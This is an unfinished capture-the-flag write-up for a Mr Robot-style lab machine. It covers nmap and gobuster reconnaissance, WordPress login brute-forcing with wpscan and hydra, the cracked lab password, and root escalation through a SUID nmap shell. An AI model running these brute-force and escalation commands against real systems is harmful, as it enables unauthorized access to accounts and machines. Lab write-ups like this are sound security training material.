# 0. Setup

# 1. Recon & Enumration
## 1.1 nmap

```bash
sudo nmap -A -T4 $TGT -p- -oN nmapOutput.nmap
```

Options explained: -A runs version detection& default scripts, -T4 is the timing template to use (0: slowest, 5: quickest), $TGT is the target IP variable I have set, -p- scan all ports, -oN is used to output the nmap scan results to a file

**nmap results:**

IMAGE NMAP

Points of interest from nmap results:
- Port 22 SSH
- Port 80 open hosting webpage
- Port 443

## 1.2 View Website

We can navigate to the website in browser using the target IP `http://<TGTIP>`
IMAGE WEBSITE BLANK

From here I generally browse the website as a user would do (alongside viewing page sources) to get an idea of the websites functionality and purpose before using enumeration tools.

**Robots.txt**
>User-agent: *
>fsocity.dic
>key-1-of-3.txt

Gobuster
```bash
gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php -s 200 -b 301,404,401 -o goBusterSeclists

gobuster dir -u http://$TGT -w fso  -x php -s 200 -b 301,404,401 -o goBusterSeclists

```

# 2. Exploitation
**Find valid username**
>mrrobot
>robot
>admin
>administrator
>Elliot Alderson
>Elliot

Elliot user valid

```
wpscan --url http://10.10.28.132/wp-login.php --usernames elliot --passwords /usr/share/wordlists/rockyou.txt

wpscan --url http://10.10.28.132/wp-login.php --usernames elliot --passwords fsocity.dic 
```

Password cracking
```
hydra -l Elliot -P fsocity.dic $TGT http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"
```

Rate limited but password would evenutally  found using the above
Password: ER28-0652


# 3. Privilege Escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

> /usr/local/bin/nmap

GTFO bins shell
```bash 
nmap --interactive
nmap> !sh
```

```bash
find / -type f -iname "key*" 2>/dev/null
```